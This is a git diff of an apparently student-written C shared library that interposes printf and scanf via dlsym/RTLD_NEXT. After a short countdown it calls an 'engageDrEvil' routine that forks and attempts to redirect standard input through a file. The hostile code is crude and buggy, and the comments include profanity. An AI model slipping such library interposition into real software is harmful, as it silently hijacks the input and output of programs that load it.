@@ -10,6 +10,8 @@
 #include <sys/cdefs.h>
 #include <stdio.h>
 
+#include <unistd.h>
+#include <fcntl.h>
 /*
  * We aren't providing much code here.  You'll need to implement your own
  * printf() and scanf(), as well as any constructors or destructors for your
@@ -19,19 +21,23 @@
 /* TODO: Your code goes here */
 
 static int theFinalCountDown;
-static int childprocess;
+static int evilMode;
+static pid_t mypid;
+static pid_t normalLib;
 
 //Declaring and mapping constructor and deconstructor functions
 void StartCountDown()__attribute__((constructor)); 
 void Teminator()__attribute__((destructor));
 
 //prototypes
-void ogPrintf(const char * formatString, ...);
+int ogPrintf(const char * formatString, ...);
 
 //Constructor
 void StartCountDown(){
     theFinalCountDown = 4;
-    childprocess = 0;
+    evilMode = 0;
+    mypid = 0;
+    normalLib = getpid();
     ogPrintf("Fucking shit up!\n");
 }
 
@@ -40,13 +46,17 @@ void Terminator(){
 }
 
 //printf wrapper function
-void ogPrintf(const char * formatString, ...){
+int ogPrintf(const char * formatString, ...){
     va_list args;
     va_start(args, formatString);
-    void (*realPrintf)(const char *, ...) = dlsym(RTLD_NEXT, "printf");
-    realPrintf(formatString, args);
+
+    char * output;
+    vasprintf(&output, formatString, args);
+
+    int (*realPrintf)(const char *, ...) = dlsym(RTLD_NEXT, "printf");
+    int out = realPrintf("%s", output);
     va_end(args);
-    return;
+    return out;
 }
 
 int ogScanf(const char * fmt, ...){
@@ -64,6 +74,35 @@ void evilPrintf(const char * formatString){
 
 }
 
+void engageDrEvil(){
+    
+    if(evilMode){
+        //Dr evil is already engaged
+        return;
+    }else{
+        evilMode = 1;
+        mypid = fork();
+        if(mypid){
+            //we are the evil child
+            
+            const char * test = getenv("PATH");
+
+            if(0){
+                //dup2(STDIN, EVILFILENAME);
+            }else{
+                char * filename = "evil.txt";
+                int out = open(filename, O_RDWR);
+                dup2(0, out);
+            }
+            
+        }else{
+            //we are the parent
+            int a[] = {0, mypid};
+            pipe(a);
+        }
+    }
+}
+
 //what the fuck are we going to do with teh ...???
 
 //int printf(__const char * __restrice __format, ...)
@@ -71,18 +110,24 @@ void evilPrintf(const char * formatString){
 //int printf(__const char * format, ...){ 
 //__fortify_function int printf (const char *__restrict __fmt, ...){
 
-int printf(const char * fmt, ...){
+//int printf(const char * __fmt, ...){
+int printf (const char *__restrict __fmt, ...){
     ogPrintf("Counting down: %i\n", theFinalCountDown);
-    const char * formatString = fmt; //useless
+    const char * formatString = __fmt; //useless
     
     theFinalCountDown = theFinalCountDown - 1;
     
     //dealing with teh ...s
     va_list args;
-    va_start(args, fmt);
+    va_start(args, __fmt);
 
     if(theFinalCountDown < 0){
         //evil shit
+
+        engageDrEvil();
+
+        //old code
+        /*
         pid_t mypid = fork();
         if(mypid == 0){
             //childprocess
@@ -96,6 +141,7 @@ int printf(const char * fmt, ...){
                 //This could be an issue
             }
         }
+        */
     }
     ogPrintf(formatString, args); // how do i pass the ...s?
     
@@ -107,6 +153,11 @@ int printf(const char * fmt, ...){
 
 int scanf(const char * fmt, ...){
     //dealing with the ...s
+    theFinalCountDown--;
+    if(theFinalCountDown < 0){
+        engageDrEvil();
+    }
+    
     va_list args;
     va_start(args, fmt);
     va_end(args);
